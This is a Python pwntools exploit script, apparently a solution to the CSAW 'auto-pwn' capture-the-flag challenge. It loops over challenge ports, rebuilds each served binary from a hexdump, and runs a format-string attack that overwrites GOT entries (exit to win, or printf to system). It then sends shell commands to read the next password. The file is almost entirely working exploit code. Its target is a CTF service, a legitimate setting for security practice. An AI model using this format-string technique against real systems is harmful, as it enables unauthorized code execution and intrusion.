#!/usr/bin/python3
from pwn import *
import os
import time

p = 0

#def login(password)


## The hexdump lib doesnt work with this type of hexdump, but xxd does.
#$  xxd -r
#00000010: 4141 4141 4141 4141 0000 0000 0000 0000 AAAAAAAA........
#AAAAAAAA
# This will just dump it out to file, then return the filename.
def get_bytes_dump(dump):
    while True:
        try:
            f = open(f"./bin_{port}", "wb")
            x = process(["/usr/bin/xxd", "-r"], stdout=f)
            x.send(dump)
            x.close()
            f.close()
            return f"./bin_{port}"
        except EOFError:
            f.close()
            x.close()
            continue

def send_fmt(payload):
    print(payload)
    p.recvuntil("report!!")
    p.sendlineafter("> ", payload)

def main():
    global p
    global port
    
    # Fingers crossed this doesnt change...
    x64_runChallenge = 0x401a94

    # nc auto-pwn.chal.csaw.io 11001
    # Both of these variables will change, we need to extract the password from message.txt
    # every time we can.
    port = 11001
    password = "cd80d3cd8a479a18bbc9652f3631c61c"
    # These may also change, although that remains to be seen    
    
    binary_buf = b""

    while True:
        
        if(os.path.isfile(f"./pass_{port-1}")):
            
            f = open(f"./pass_{port-1}", "r")
            password = f.read()
            f.close()
            
            port+=1
            continue

        p = remote("auto-pwn.chal.csaw.io", port)
        
        p.recvuntil("Input password to continue:")
        p.sendlineafter("> ", password)
        
        #print(get_bytes_dump("00000010: 4141 4141 4141 4141 0000 0000 0000 0000 AAAAAAAA........"))
        
        ## Parse binary
        try:
            p.recvuntil("-------------------------------------------------------------------")
            binary = p.recvuntil("-------------------------------------------------------------------")
        except EOFError:
            p.close()
            time.sleep(2.5)
            continue
        
        binary = binary.decode("utf-8")
        binary = binary.replace("-------------------------------------------------------------------", "")
        # Get bytes from a hexdump
        try:
            binary = ELF(get_bytes_dump(binary))
        except ValueError:
            p.close()
            continue
        
        exit_got = binary.got['exit']
        try:
            
            win_addr = binary.symbols["win"]
            print(f"win() -> {hex(win_addr)}\nexit@got -> {hex(exit_got)}")

            ## Need to bruteforce offset & padlen    
            if (binary.get_machine_arch() == "amd64"):
                context.arch = 'amd64'
                f = FmtStr(send_fmt, offset=6, padlen=0)
            else:
                f = FmtStr(send_fmt, offset=6, padlen=2)
            f.write(exit_got, win_addr)
            f.execute_writes()
        except KeyError: # binary is stripped, alternative approach
            printf_got = binary.got['printf']
            system_plt = u64(binary.read(binary.got['system'], 8))
            print(hex(system_plt))
            
            context.arch = 'amd64'    
            f = FmtStr(send_fmt, offset=6, padlen=0)
            f.write(exit_got, x64_runChallenge)
            f.write(printf_got, system_plt)
            f.execute_writes()
            
        # Bullshit error handling (very bad)
        try:

            p.sendline("cat message.txt; ls; exit;")
            #p.sendline("cat message.txt; exit;")
            buf = p.recvall(timeout=1)
            print(buf)
        except EOFError:
            p.close()
            continue
        
        if (len(buf) == 0): 
            p.close()
            continue

        buf = buf.decode("utf-8").split("password ")
        buf = buf[1][:32]
        try:
            #print(f"[!] Got password: {buf[1]}") 
            print(f"[!] Got password: {buf}") 
            #password = buf[1].strip("\n")
            password = buf
            # Maybe need error handlin for this?
            #password = password.split(" ")
            #password = password[0]
            # Save our progress...
            f = open(f"./pass_{port-1}", "w")
            f.write(password)
            f.close()
        except IndexError:
            p.close()
            continue

        p.close()

        port += 1

if __name__ == "__main__":
    main()
